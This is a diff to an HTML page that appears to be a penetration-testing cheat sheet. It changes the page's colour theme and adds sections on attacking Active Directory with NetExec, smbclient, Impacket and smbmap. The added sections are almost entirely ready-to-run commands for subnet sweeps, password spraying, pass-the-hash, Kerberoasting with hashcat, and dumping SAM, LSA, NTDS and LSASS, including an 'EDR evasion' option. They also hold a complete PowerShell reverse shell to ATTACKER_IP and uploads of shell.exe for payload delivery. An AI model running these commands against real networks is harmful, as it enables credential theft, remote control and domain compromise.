@@ -9,39 +9,41 @@
     <link href="https://fonts.googleapis.com/css2?family=Atkinson+Hyperlegible+Mono:ital,wght@0,200..800;1,200..800&display=swap" rel="stylesheet">
     <link rel="stylesheet" href="/stuff.css">
     <style>
-        /* ── Arctic blue / silver theme override ── */
+        /* ── Chrome-silver theme override ── */
         :root {
-            --green:         #7dd3fc;
-            --green-bright:  #bae6fd;
-            --green-dim:     #38bdf8;
-            --green-soft:    #0284c7;
-            --green-ghost:   rgba(125,211,252,0.30);
-            --text:          #b0cfe8;
-            --text-dim:      #3d6070;
-            --glow:          0 0 4px rgba(125,211,252,0.55), 0 0 12px rgba(125,211,252,0.22);
-            --glow-strong:   0 0 6px rgba(125,211,252,0.8), 0 0 22px rgba(125,211,252,0.4), 0 0 44px rgba(125,211,252,0.18);
-            --panel-edge:    rgba(125,211,252,0.18);
-            --panel:         rgba(6,16,28,0.60);
-            --bg-base:       #050c14;
-            --bg-deep:       #020609;
+            --green:         #aab8c4;
+            --green-bright:  #dde6ef;
+            --green-dim:     #7a96aa;
+            --green-soft:    #4e6475;
+            --green-ghost:   rgba(170,184,196,0.28);
+            --text:          #b0bec8;
+            --text-dim:      #3d5060;
+            --glow:          0 0 4px rgba(190,205,218,0.45), 0 0 12px rgba(170,185,200,0.18);
+            --glow-strong:   0 0 6px rgba(210,222,234,0.65), 0 0 20px rgba(185,200,215,0.30), 0 0 40px rgba(160,178,194,0.12);
+            --panel-edge:    rgba(170,184,196,0.14);
+            --panel:         rgba(6,9,14,0.65);
+            --bg-base:       #060810;
+            --bg-deep:       #030507;
         }
         body {
             background:
-                radial-gradient(ellipse 120% 80% at 50% -10%, rgba(56,189,248,0.07), transparent 60%),
-                radial-gradient(ellipse 100% 60% at 50% 120%, rgba(14,116,144,0.05), transparent 60%),
+                radial-gradient(ellipse 120% 80% at 50% -10%, rgba(160,178,195,0.05), transparent 60%),
+                radial-gradient(ellipse 100% 60% at 50% 120%, rgba(120,145,165,0.03), transparent 60%),
                 var(--bg-base) !important;
         }
-        /* silver-blue sweep for h2 headings */
+        /* chrome-silver sweep for h2 headings */
         .shine {
             background: linear-gradient(
                 100deg,
-                #3a5060 0%,
-                #7dd3fc 28%,
-                #e4f4ff 46%,
+                #2c3a48 0%,
+                #6a8090 20%,
+                #aab8c4 36%,
+                #e8eef4 46%,
                 #ffffff 50%,
-                #e4f4ff 54%,
-                #94a3b8 72%,
-                #3a5060 100%
+                #e8eef4 54%,
+                #aab8c4 64%,
+                #6a8090 80%,
+                #2c3a48 100%
             ) !important;
             background-size: 220% 100% !important;
             -webkit-background-clip: text !important;
@@ -51,7 +53,7 @@
             filter: drop-shadow(0 0 6px rgba(125,211,252,0.25)) !important;
             animation: silver-wave 4.5s ease-in-out infinite !important;
         }
-        /* blue traffic-light dot */
+        /* silver traffic-light dot */
         .green { background: var(--green-dim) !important; box-shadow: 0 0 6px var(--green-dim) !important; }
         /* decision map accent */
         .dm-row { border-left-color: var(--green-soft); }
@@ -71,8 +73,9 @@
 
     <!-- set blue matrix rain before terminal.js loads -->
     <script>
-        window.matrixColor     = '#38bdf8';
-        window.matrixColorHigh = '#bae6fd';
+        window.matrixColor     = '#7a96aa';   /* dim silver characters */
+        window.matrixColorHigh = '#dde6ef';   /* bright silver flash */
+        window.matrixFade      = 'rgba(6,8,12,0.085)'; /* neutral dark trail */
     </script>
 
     <div id="wrapper">
@@ -665,6 +668,392 @@ rundll32 C:\Windows\System32\comsvcs.dll MiniDump %lsasspid% C:\Windows\Temp\lsa
                 </div>
             </details>
 
+            <!-- 11 nxc recon -->
+            <details id="s11">
+                <summary><span class="sum-num">11</span><span class="sum-title">nxc — Recon &amp; Enumeration</span><span class="sum-arrow">▶</span></summary>
+                <div class="section-body">
+                    <p>NetExec (formerly CrackMapExec). Syntax: <code>nxc &lt;protocol&gt; &lt;target&gt; -u USER -p PASS [options]</code>. Also accepts <code>-H NTLMHASH</code> for pass-the-hash and <code>--use-kcache -k</code> for Kerberos (KRB5CCNAME must be set).</p>
+                    <pre class="cb"><span class="cm"># ── Host discovery + SMB info ────────────────────────────────────────────────</span>
+nxc smb 192.168.1.0/24                              # sweep subnet — OS, signing, hostname
+nxc smb 192.168.1.0/24 --gen-relay-list relay.txt  # hosts without signing = relay targets
+
+<span class="cm"># ── Null / guest access check ────────────────────────────────────────────────</span>
+nxc smb DC_IP -u &#x27;&#x27; -p &#x27;&#x27;                           # null session
+nxc smb DC_IP -u &#x27;Guest&#x27; -p &#x27;&#x27;                      # guest session
+
+<span class="cm"># ── Credential validation ─────────────────────────────────────────────────────</span>
+nxc smb DC_IP -u username -p &#x27;Password123&#x27;
+nxc smb DC_IP -u username -p &#x27;Password123&#x27; --local-auth   # local account
+nxc smb DC_IP -u username -H NTLMHASH                     # pass-the-hash
+
+<span class="cm"># ── User enumeration ──────────────────────────────────────────────────────────</span>
+nxc smb DC_IP -u username -p &#x27;Password123&#x27; --users
+nxc smb DC_IP -u username -p &#x27;Password123&#x27; --users | grep -i &quot;badpwdcount\|admin&quot;
+
+<span class="cm"># RID brute — enumerate all accounts (works with null/guest too)</span>
+nxc smb DC_IP -u &#x27;&#x27; -p &#x27;&#x27; --rid-brute
+nxc smb DC_IP -u &#x27;Guest&#x27; -p &#x27;&#x27; --rid-brute 10000
+
+<span class="cm"># ── Group enumeration ─────────────────────────────────────────────────────────</span>
+nxc smb DC_IP -u username -p &#x27;Password123&#x27; --groups
+nxc smb DC_IP -u username -p &#x27;Password123&#x27; --groups &quot;Domain Admins&quot;
+
+<span class="cm"># ── Share enumeration ─────────────────────────────────────────────────────────</span>
+nxc smb DC_IP -u username -p &#x27;Password123&#x27; --shares
+nxc smb DC_IP -u &#x27;&#x27; -p &#x27;&#x27; --shares                        # null session shares
+
+<span class="cm"># Spider share — recursively list all files (looking for creds in configs etc.)</span>
+nxc smb DC_IP -u username -p &#x27;Password123&#x27; -M spider_plus
+nxc smb DC_IP -u username -p &#x27;Password123&#x27; -M spider_plus -o READ_ONLY=false
+
+<span class="cm"># Filter spider output for interesting extensions</span>
+cat /tmp/nxc_spider.json | python3 -c \
+  &quot;import json,sys; [print(f) for f in json.load(sys.stdin)[&#x27;DC_IP&#x27;][&#x27;shares&#x27;] if &#x27;.xml&#x27; in f or &#x27;.ini&#x27; in f or &#x27;.config&#x27; in f]&quot;
+
+<span class="cm"># ── Sessions / logged-on users ────────────────────────────────────────────────</span>
+nxc smb DC_IP -u username -p &#x27;Password123&#x27; --sessions
+nxc smb DC_IP -u username -p &#x27;Password123&#x27; --loggedon-users
+nxc smb 192.168.1.0/24 -u username -p &#x27;Password123&#x27; --loggedon-users  # domain-wide
+
+<span class="cm"># ── Password policy ───────────────────────────────────────────────────────────</span>
+nxc smb DC_IP -u username -p &#x27;Password123&#x27; --pass-pol
+<span class="cm"># → reveals lockout threshold before spraying</span></pre>
+                </div>
+            </details>
+
+            <!-- 12 nxc attacks -->
+            <details id="s12">
+                <summary><span class="sum-num">12</span><span class="sum-title">nxc — Password Spraying &amp; Attacks</span><span class="sum-arrow">▶</span></summary>
+                <div class="section-body">
+                    <div class="tip">Always run <code>--pass-pol</code> first to check the lockout threshold before any spray.</div>
+                    <pre class="cb"><span class="cm"># ── Password spraying ────────────────────────────────────────────────────────</span>
+<span class="cm"># ALWAYS check --pass-pol first to know the lockout threshold</span>
+nxc smb DC_IP -u users.txt -p &#x27;Password123&#x27; --continue-on-success
+nxc smb DC_IP -u users.txt -p &#x27;Password123&#x27; --no-bruteforce   # one attempt per user
+
+<span class="cm"># Spray across all subnet hosts (find local admin reuse)</span>
+nxc smb 192.168.1.0/24 -u username -p &#x27;Password123&#x27; --continue-on-success
+
+<span class="cm"># Paired spray: line-by-line user:pass from two files</span>
+nxc smb DC_IP -u users.txt -p passwords.txt --no-bruteforce --continue-on-success
+
+<span class="cm"># LDAP spray — quieter, doesn&#x27;t touch NTLM/SMB logs on some configs</span>
+nxc ldap DC_IP -u users.txt -p &#x27;Password123&#x27; --continue-on-success
+
+<span class="cm"># ── Pass-the-Hash ─────────────────────────────────────────────────────────────</span>
+nxc smb TARGET_IP -u Administrator -H NTLMHASH
+nxc smb 192.168.1.0/24 -u Administrator -H NTLMHASH     # spray all hosts
+nxc smb TARGET_IP -u Administrator -H NTLMHASH --local-auth  # local admin
+
+<span class="cm"># ── Pass-the-Ticket (Kerberos CCACHE) ────────────────────────────────────────</span>
+export KRB5CCNAME=/path/to/ticket.ccache
+nxc smb TARGET_IP -u username --use-kcache -k
+nxc smb DC_IP -u Administrator --use-kcache -k --ntds   # dump NTDS with ticket
+
+<span class="cm"># ── Kerberoasting ────────────────────────────────────────────────────────────</span>
+nxc ldap DC_IP -u username -p &#x27;Password123&#x27; --kerberoasting kerberoast.txt
+nxc ldap DC_IP -u username -H NTLMHASH --kerberoasting kerberoast.txt
+
+<span class="cm"># Crack (hashcat)</span>
+hashcat -m 13100 kerberoast.txt rockyou.txt             # RC4 (etype 23)
+hashcat -m 19600 kerberoast.txt rockyou.txt             # AES128 (etype 17)
+hashcat -m 19700 kerberoast.txt rockyou.txt             # AES256 (etype 18)
+
+<span class="cm"># ── AS-REP Roasting ───────────────────────────────────────────────────────────</span>
+nxc ldap DC_IP -u username -p &#x27;Password123&#x27; --asreproast asrep.txt
+nxc ldap DC_IP -u users.txt -p &#x27;&#x27; --asreproast asrep.txt  # no creds needed if you have userlist
+
+<span class="cm"># Crack (hashcat)</span>
+hashcat -m 18200 asrep.txt rockyou.txt
+
+<span class="cm"># ── LAPS password read (AllExtendedRights on computer object) ─────────────────</span>
+nxc ldap DC_IP -u username -p &#x27;Password123&#x27; -M laps
+nxc ldap DC_IP -u username -p &#x27;Password123&#x27; -M laps -o COMPUTER=TARGET_NAME
+
+<span class="cm"># ── Find where your account has local admin ───────────────────────────────────</span>
+nxc smb 192.168.1.0/24 -u username -p &#x27;Password123&#x27;
+<span class="cm"># → Hosts showing &quot;(Pwn3d!)&quot; = local admin access confirmed</span></pre>
+                </div>
+            </details>
+
+            <!-- 13 nxc dumping -->
+            <details id="s13">
+                <summary><span class="sum-num">13</span><span class="sum-title">nxc — Execution &amp; Credential Dumping</span><span class="sum-arrow">▶</span></summary>
+                <div class="section-body">
+                    <pre class="cb"><span class="cm"># ── Command execution ────────────────────────────────────────────────────────</span>
+nxc smb TARGET_IP -u username -p &#x27;Password123&#x27; -x &#x27;whoami /all&#x27;
+nxc smb TARGET_IP -u username -p &#x27;Password123&#x27; -X &#x27;Get-Process&#x27;            # PowerShell
+
+<span class="cm"># Execution methods (SMBexec = no dropped binary; WMIexec = WMI; MMCexec = MMC)</span>
+nxc smb TARGET_IP -u username -p &#x27;Password123&#x27; -x &#x27;whoami&#x27; --exec-method smbexec
+nxc smb TARGET_IP -u username -p &#x27;Password123&#x27; -x &#x27;whoami&#x27; --exec-method wmiexec
+nxc smb TARGET_IP -u username -p &#x27;Password123&#x27; -x &#x27;whoami&#x27; --exec-method mmcexec
+nxc smb TARGET_IP -u username -p &#x27;Password123&#x27; -x &#x27;whoami&#x27; --exec-method atexec
+
+<span class="cm"># Reverse shell via execution</span>
+nxc smb TARGET_IP -u username -p &#x27;Password123&#x27; \
+  -X &#x27;$c=New-Object Net.Sockets.TCPClient(&quot;ATTACKER_IP&quot;,4444);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2&gt;&amp;1|Out-String);$sb2=$sb+&quot;PS &quot;+(pwd).Path+&quot;&amp;gt; &quot;;$sb3=[text.encoding]::ASCII.GetBytes($sb2);$s.Write($sb3,0,$sb3.Length)}&#x27;
+
+<span class="cm"># ── SAM — local account hashes ───────────────────────────────────────────────</span>
+nxc smb TARGET_IP -u username -p &#x27;Password123&#x27; --sam
+nxc smb 192.168.1.0/24 -u username -p &#x27;Password123&#x27; --sam  # sweep all hosts
+
+<span class="cm"># ── LSA secrets — service account plaintexts ──────────────────────────────────</span>
+nxc smb TARGET_IP -u username -p &#x27;Password123&#x27; --lsa
+
+<span class="cm"># ── NTDS.dit — full domain hash dump ─────────────────────────────────────────</span>
+nxc smb DC_IP -u username -p &#x27;Password123&#x27; --ntds
+nxc smb DC_IP -u username -p &#x27;Password123&#x27; --ntds --users Administrator  # single user
+nxc smb DC_IP -u username -p &#x27;Password123&#x27; --ntds vss    # VSS method (stealthier)
+
+<span class="cm"># ── LSASS dump via modules ────────────────────────────────────────────────────</span>
+nxc smb TARGET_IP -u username -p &#x27;Password123&#x27; -M lsassy       # lsassy (recommended)
+nxc smb TARGET_IP -u username -p &#x27;Password123&#x27; -M nanodump      # nanodump (EDR evasion)
+nxc smb TARGET_IP -u username -p &#x27;Password123&#x27; -M procdump      # ProcDump upload + dump
+nxc smb TARGET_IP -u username -p &#x27;Password123&#x27; -M handlekatz    # handle duplication
+nxc smb TARGET_IP -u username -p &#x27;Password123&#x27; -M mimikatz      # direct mimikatz (noisy)
+
+<span class="cm"># Module options example (lsassy with method override)</span>
+nxc smb TARGET_IP -u username -p &#x27;Password123&#x27; -M lsassy \
+  -o METHOD=PROCDUMP
+
+<span class="cm"># ── GPP passwords — plaintext creds in SYSVOL ────────────────────────────────</span>
+nxc smb DC_IP -u username -p &#x27;Password123&#x27; -M gpp_password
+nxc smb DC_IP -u username -p &#x27;Password123&#x27; -M gpp_autologin</pre>
+                    <div class="tip"><code>lsassy</code> is the recommended LSASS module — it avoids writing a dump file to disk by reading memory remotely via a file handle. <code>nanodump</code> is the EDR-evasion pick.</div>
+                </div>
+            </details>
+
+            <!-- 14 nxc protocols/modules -->
+            <details id="s14">
+                <summary><span class="sum-num">14</span><span class="sum-title">nxc — LDAP, WinRM, MSSQL &amp; Modules</span><span class="sum-arrow">▶</span></summary>
+                <div class="section-body">
+                    <pre class="cb"><span class="cm"># ── LDAP enumeration ─────────────────────────────────────────────────────────</span>
+nxc ldap DC_IP -u username -p &#x27;Password123&#x27; --kdcHost DC_IP
+
+<span class="cm"># Unconstrained delegation (high-value pivot hosts)</span>
+nxc ldap DC_IP -u username -p &#x27;Password123&#x27; --trusted-for-delegation
+
+<span class="cm"># AdminSDHolder-protected accounts (admin-count=1 → harder to modify ACLs)</span>
+nxc ldap DC_IP -u username -p &#x27;Password123&#x27; --admin-count
+
+<span class="cm"># Password not required (PASSWD_NOTREQD flag)</span>
+nxc ldap DC_IP -u username -p &#x27;Password123&#x27; --password-not-required
+
+<span class="cm"># DONT_REQ_PREAUTH — AS-REP roastable accounts</span>
+nxc ldap DC_IP -u username -p &#x27;Password123&#x27; --no-preauth
+
+<span class="cm"># Machine account quota (how many machine accounts a user can add — default 10)</span>
+nxc ldap DC_IP -u username -p &#x27;Password123&#x27; -M maq
+
+<span class="cm"># Descriptions with passwords (admins leave creds in AD description fields)</span>
+nxc ldap DC_IP -u username -p &#x27;Password123&#x27; -M get-desc-users
+
+<span class="cm"># ADCS — enumerate certificate authorities and templates</span>
+nxc ldap DC_IP -u username -p &#x27;Password123&#x27; -M adcs
+nxc ldap DC_IP -u username -p &#x27;Password123&#x27; -M adcs -o SERVER=CA_SERVER
+
+<span class="cm"># ── WinRM ─────────────────────────────────────────────────────────────────────</span>
+nxc winrm TARGET_IP -u username -p &#x27;Password123&#x27;
+nxc winrm TARGET_IP -u username -H NTLMHASH                # PTH into WinRM
+nxc winrm TARGET_IP -u username -p &#x27;Password123&#x27; -x &#x27;whoami&#x27;
+nxc winrm 192.168.1.0/24 -u username -p &#x27;Password123&#x27;      # find WinRM access
+
+<span class="cm"># ── MSSQL ─────────────────────────────────────────────────────────────────────</span>
+nxc mssql DB_IP -u sa -p &#x27;Password123&#x27;
+nxc mssql DB_IP -u sa -p &#x27;Password123&#x27; --local-auth
+nxc mssql DB_IP -u sa -p &#x27;Password123&#x27; -q &#x27;SELECT name FROM sys.databases&#x27;
+nxc mssql DB_IP -u sa -p &#x27;Password123&#x27; -x &#x27;whoami&#x27;         # via xp_cmdshell
+nxc mssql DB_IP -u sa -p &#x27;Password123&#x27; -M mssql_priv       # check + enable xp_cmdshell
+nxc mssql DB_IP -u username -p &#x27;Password123&#x27; -M mssql_priv -o ACTION=privesc
+
+<span class="cm"># ── SSH ────────────────────────────────────────────────────────────────────────</span>
+nxc ssh HOST_IP -u username -p &#x27;Password123&#x27;
+nxc ssh HOST_IP -u username --key-file id_rsa
+nxc ssh 192.168.1.0/24 -u root -p &#x27;Password123&#x27;
+
+<span class="cm"># ── Vulnerability / coercion checks ──────────────────────────────────────────</span>
+<span class="cm"># PrintNightmare — Print Spooler RCE (CVE-2021-1675 / CVE-2021-34527)</span>
+nxc smb TARGET_IP -u username -p &#x27;Password123&#x27; -M printnightmare
+
+<span class="cm"># ZeroLogon — safe check ONLY (never run exploit on production)</span>
+nxc smb DC_IP -u &#x27;&#x27; -p &#x27;&#x27; -M zerologon
+
+<span class="cm"># PetitPotam — NTLM coercion via MS-EFSR</span>
+nxc smb TARGET_IP -u username -p &#x27;Password123&#x27; -M petitpotam \
+  -o LISTENER=&lt;ATTACKER_IP&gt;
+
+<span class="cm"># WebDAV — detect WebClient service (enables HTTP-based coercion)</span>
+nxc smb TARGET_IP -u username -p &#x27;Password123&#x27; -M webdav
+
+<span class="cm"># EternalBlue MS17-010 (unauthenticated)</span>
+nxc smb TARGET_IP -u &#x27;&#x27; -p &#x27;&#x27; -M ms17-010
+
+<span class="cm"># ── BloodHound collection via nxc ────────────────────────────────────────────</span>
+nxc smb DC_IP -u username -p &#x27;Password123&#x27; -M bloodhound \
+  -o COLLECTION_METHOD=All DOMAIN=DOMAIN.LOCAL NS=DC_IP</pre>
+                </div>
+            </details>
+
+            <!-- 15 SMB -->
+            <details id="s15">
+                <summary><span class="sum-num">15</span><span class="sum-title">SMB Share Access — smbclient &amp; smbclient.py</span><span class="sum-arrow">▶</span></summary>
+                <div class="section-body">
+
+                    <h3>smbclient (native)</h3>
+                    <pre class="cb"><span class="cm"># ── List shares ──────────────────────────────────────────────────────────────</span>
+smbclient -L //DC_IP -U &#x27;username%Password123&#x27;
+smbclient -L //DC_IP -U &#x27;DOMAIN\username%Password123&#x27;
+smbclient -L //DC_IP -N                                   # null session (no creds)
+smbclient -L //DC_IP -U &#x27;Guest%&#x27;                         # guest session
+
+<span class="cm"># With NTLM hash (pass-the-hash)</span>
+smbclient -L //DC_IP -U &#x27;username&#x27; --pw-nt-hash NTLMHASH
+
+<span class="cm"># Kerberos (KRB5CCNAME must be set)</span>
+smbclient -L //DC_IP -U &#x27;username&#x27; -k
+
+<span class="cm"># ── Connect to a share ────────────────────────────────────────────────────────</span>
+smbclient //DC_IP/SHARENAME -U &#x27;username%Password123&#x27;
+smbclient //DC_IP/SHARENAME -U &#x27;DOMAIN\username%Password123&#x27;
+smbclient //DC_IP/SHARENAME -N                            # null session
+smbclient //DC_IP/SHARENAME -U &#x27;username&#x27; --pw-nt-hash NTLMHASH
+smbclient //DC_IP/SHARENAME -U &#x27;username&#x27; -k             # Kerberos
+
+<span class="cm"># ── Common shares to check ───────────────────────────────────────────────────</span>
+smbclient //DC_IP/C$ -U &#x27;username%Password123&#x27;           # full C: drive (admin)
+smbclient //DC_IP/ADMIN$ -U &#x27;username%Password123&#x27;       # Windows install dir (admin)
+smbclient //DC_IP/SYSVOL -U &#x27;username%Password123&#x27;       # GPO files — hunt GPP creds
+smbclient //DC_IP/NETLOGON -U &#x27;username%Password123&#x27;     # logon scripts
+
+<span class="cm"># ── Inside the smbclient shell ────────────────────────────────────────────────</span>
+<span class="cm"># smb: \&gt;</span>
+ls                           # list current directory
+ls subfolder\                # list specific path
+cd subfolder                 # change directory
+pwd                          # print current remote path
+lcd /local/path              # change LOCAL working directory
+get filename                 # download a file
+get &quot;file with spaces.txt&quot;   # download file with spaces in name
+put /local/file remote_name  # upload a file
+mkdir newdir                 # create remote directory
+rmdir dir                    # remove remote directory
+del filename                 # delete remote file
+rename oldname newname       # rename remote file
+mget *                       # download ALL files in current dir
+mget *.xml                   # download matching files
+mput *.txt                   # upload matching local files
+
+<span class="cm"># Toggle prompts and recursion for bulk operations</span>
+prompt off                   # disable y/n confirmation on mget/mput
+recurse on                   # enable recursive traversal
+mget *                       # now downloads entire directory tree
+
+<span class="cm"># ── Non-interactive one-liners ────────────────────────────────────────────────</span>
+<span class="cm"># Pass commands with -c (semicolon-separated)</span>
+smbclient //DC_IP/SHARENAME -U &#x27;username%Password123&#x27; \
+  -c &#x27;ls&#x27;
+
+<span class="cm"># Recursively download everything in the share</span>
+smbclient //DC_IP/SHARENAME -U &#x27;username%Password123&#x27; \
+  -c &#x27;prompt off; recurse on; mget *&#x27;
+
+<span class="cm"># Download to a specific local dir</span>
+smbclient //DC_IP/SHARENAME -U &#x27;username%Password123&#x27; \
+  -c &#x27;prompt off; recurse on; lcd /tmp/loot; mget *&#x27;
+
+<span class="cm"># Download a specific file</span>
+smbclient //DC_IP/SHARENAME -U &#x27;username%Password123&#x27; \
+  -c &#x27;get scripts\backup.ps1&#x27;
+
+<span class="cm"># Upload a file (payload delivery)</span>
+smbclient //DC_IP/SHARENAME -U &#x27;username%Password123&#x27; \
+  -c &#x27;put /tmp/shell.exe shell.exe&#x27;
+
+<span class="cm"># List SYSVOL recursively (hunt for GPP creds / passwords in scripts)</span>
+smbclient //DC_IP/SYSVOL -U &#x27;username%Password123&#x27; \
+  -c &#x27;prompt off; recurse on; ls&#x27;
+
+<span class="cm"># ── Mount as a filesystem (easier to navigate / grep) ────────────────────────</span>
+sudo mkdir -p /mnt/smb
+sudo mount -t cifs //DC_IP/SHARENAME /mnt/smb \
+  -o username=username,password=&#x27;Password123&#x27;,domain=DOMAIN
+sudo mount -t cifs //DC_IP/SHARENAME /mnt/smb \
+  -o username=username,password=&#x27;Password123&#x27;,domain=DOMAIN,vers=3.0
+
+<span class="cm"># After mounting — grep for passwords across the whole share</span>
+grep -ri &#x27;password&#x27; /mnt/smb/ 2&gt;/dev/null
+grep -ri &#x27;pass&#x27; /mnt/smb/ --include=&#x27;*.xml&#x27; --include=&#x27;*.ini&#x27; --include=&#x27;*.config&#x27;
+find /mnt/smb -name &#x27;*.kdbx&#x27; -o -name &#x27;*.pfx&#x27; -o -name &#x27;unattend*&#x27; 2&gt;/dev/null
+
+<span class="cm"># Unmount</span>
+sudo umount /mnt/smb</pre>
+
+                    <h3>smbclient.py (Impacket) + smbmap</h3>
+                    <pre class="cb"><span class="cm"># ── Connect + list shares ─────────────────────────────────────────────────────</span>
+python3 smbclient.py DOMAIN.LOCAL/username:&#x27;Password123&#x27;@DC_IP
+python3 smbclient.py DOMAIN.LOCAL/username@DC_IP -hashes :NTLMHASH
+python3 smbclient.py DOMAIN.LOCAL/username@DC_IP -hashes LMHASH:NTLMHASH
+
+<span class="cm"># Kerberos (KRB5CCNAME must be set)</span>
+export KRB5CCNAME=ticket.ccache
+python3 smbclient.py DOMAIN.LOCAL/username@DC01.DOMAIN.LOCAL -k -no-pass
+
+<span class="cm"># Null session</span>
+python3 smbclient.py -no-pass //DC_IP
+
+<span class="cm"># ── Inside the smbclient.py shell ────────────────────────────────────────────</span>
+<span class="cm"># Prompt: #&gt;</span>
+shares                            # list all available shares
+use SHARENAME                     # connect to a share (required before ls/get)
+ls                                # list current directory
+ls subfolder/                     # list specific subdirectory
+cd subfolder                      # change directory
+get filename                      # download a file to current local dir
+get filename /local/path/out.txt  # download to specific local path
+put /local/file                   # upload a file
+put /local/file remote_name       # upload with different remote name
+mkdir newdir                      # create directory
+rm filename                       # delete file
+cat filename                      # print file contents to stdout
+info                              # connection info (hostname, OS, signing)
+exit                              # disconnect
+
+<span class="cm"># ── Non-interactive with -c ───────────────────────────────────────────────────</span>
+<span class="cm"># List shares without entering the shell</span>
+python3 smbclient.py DOMAIN.LOCAL/username:&#x27;Password123&#x27;@DC_IP \
+  -c &#x27;shares&#x27;
+
+<span class="cm"># Connect to a share and list root</span>
+python3 smbclient.py DOMAIN.LOCAL/username:&#x27;Password123&#x27;@DC_IP \
+  -c &#x27;use C$; ls&#x27;
+
+<span class="cm"># Download a specific file non-interactively</span>
+python3 smbclient.py DOMAIN.LOCAL/username:&#x27;Password123&#x27;@DC_IP \
+  -c &#x27;use SHARENAME; get secrets\passwords.xlsx&#x27;
+
+<span class="cm"># Upload a file non-interactively</span>
+python3 smbclient.py DOMAIN.LOCAL/username:&#x27;Password123&#x27;@DC_IP \
+  -c &#x27;use C$; cd Windows\Temp; put /tmp/shell.exe&#x27;
+
+<span class="cm"># Cat a remote file directly (great for quick credential checks)</span>
+python3 smbclient.py DOMAIN.LOCAL/username:&#x27;Password123&#x27;@DC_IP \
+  -c &#x27;use SYSVOL; cat DOMAIN.LOCAL/Policies/{GUID}/Machine/Preferences/Groups/Groups.xml&#x27;
+
+<span class="cm"># ── smbmap — permission-aware share listing (complements smbclient) ───────────</span>
+smbmap -H DC_IP -u username -p &#x27;Password123&#x27;             # list shares + R/W/NO ACCESS
+smbmap -H DC_IP -u username -p &#x27;Password123&#x27; -r SHARE    # list share contents
+smbmap -H DC_IP -u username -p &#x27;Password123&#x27; -R SHARE    # recursive listing
+smbmap -H DC_IP -u &#x27;&#x27; -p &#x27;&#x27;                              # null session
+smbmap -H DC_IP -u username -p &#x27;Password123&#x27; \
+  --download &#x27;SHARE\path\file.txt&#x27;                       # download specific file
+smbmap -H DC_IP -u username -p &#x27;Password123&#x27; \
+  --upload /local/file &#x27;SHARE\dest.txt&#x27;                  # upload specific file
+smbmap -H DC_IP -u username -H NTLMHASH                  # pass-the-hash</pre>
+
+                </div>
+            </details>
+
         </main>
     </div>
 
@@ -674,9 +1063,9 @@ rundll32 C:\Windows\System32\comsvcs.dll MiniDump %lsasspid% C:\Windows\Temp\lsa
         <p>Last updated : 2026-09-30</p>
         <p class="status"><span class="dot"></span>connection encrypted // session active</p>
         <svg width="100" height="80" viewBox="0 0 100 80">
-            <rect x="10" y="10" width="80" height="50" rx="6" ry="6" fill="none" stroke="#38bdf8" stroke-width="3"/>
-            <rect x="40" y="65" width="20" height="5" fill="#38bdf8"/>
-            <rect x="30" y="70" width="40" height="4" fill="#38bdf8"/>
+            <rect x="10" y="10" width="80" height="50" rx="6" ry="6" fill="none" stroke="#7a96aa" stroke-width="3"/>
+            <rect x="40" y="65" width="20" height="5" fill="#7a96aa"/>
+            <rect x="30" y="70" width="40" height="4" fill="#7a96aa"/>
         </svg>
     </footer>
 
